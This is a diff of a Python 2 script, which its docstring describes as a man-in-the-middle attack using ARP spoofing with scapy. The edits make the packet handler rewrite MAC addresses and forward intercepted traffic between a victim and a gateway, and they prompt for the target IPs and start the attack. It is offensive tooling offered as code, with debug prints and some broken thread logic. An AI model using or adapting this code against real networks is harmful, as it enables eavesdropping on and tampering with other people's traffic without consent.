@@ -2,7 +2,7 @@
 Author: Doron Goldman
 An python program implenting man in the middle attack through arp spoofing
 """
-from socket import gethostbyname, gethostname
+import socket
 import scapy.all as sp
 import sys
 import os
@@ -14,7 +14,7 @@ REPLAY = 2
 
 
 class Attack_Info(object, ):
-    def __init__(self, gate_ip, victim_ip, my_ip):
+    def __init__(self,victim_ip ,gate_ip , my_ip):
         self.mIP = my_ip
         self.gIP = gate_ip
         self.vIP = victim_ip
@@ -36,7 +36,7 @@ class Attack_Info(object, ):
 
 
 class Attack_Thread(object, ):
-    TIMEOUT = 25
+    TIMEOUT = 10
 
 
     @staticmethod
@@ -52,7 +52,6 @@ class Attack_Thread(object, ):
 
     def __init__(self, ):
         self.stop = threading.Event() # used for closing thread and sub threads cleanly
-        super(Attack_Thread, self).__init__()
 
     def close(self,):
         self.stop.clear()
@@ -93,17 +92,27 @@ class Mitm_Thread(threading.Thread):
         super(Mitm_Thread, self).__init__()
 
     def run(self, ):
-        bpf_filter = '(not dst host %s) and (not  src host %s) ' % (info.mIP, info.mIP)
+        print info.mIP
+        bpf_filter = 'not (dst host %s or  src host %s) ' % (info.mIP, info.mIP)
+        print bpf_filter
         while self.stop.wait(0):
-            sp.sniff(filter=bpf_filter, timeout=0.2, prn=self.pkt_handler)
+            sp.sniff(filter=bpf_filter, count=1, timeout=0.2, prn=self.pkt_handler)
 
     def pkt_handler(self, pkt):
         if pkt.haslayer(sp.IP):
-            print pkt
-            sp.send(pkt)
+            ip = pkt.getlayer(sp.IP)
+            # if the ip is not in the arp table take the gateaway ip(most of the times true)
+            get_mac = lambda x: info.arp_table.get(x,info.arp_table[info.gIP])
+            print ip.src, get_mac(ip.src)
+            print ip.dst, get_mac(ip.dst)
+            ether = sp.Ether(src=get_mac(ip.src), dst=get_mac(ip.dst))
+            sp.sendp(ether/ip)
 
 
 
+print "newst"
 vIP, gIP = tuple(raw_input("pls enter " + x + " ") for x in ["victimIP", "gateIP"])
-mIP = socket.gethostbyname(socket.gethostname())
+mIP = ((([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")] or [[(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) + ["no IP found"])[0])
 info = Attack_Info(vIP, gIP, mIP)
+attack = Attack_Thread()
+attack.run()
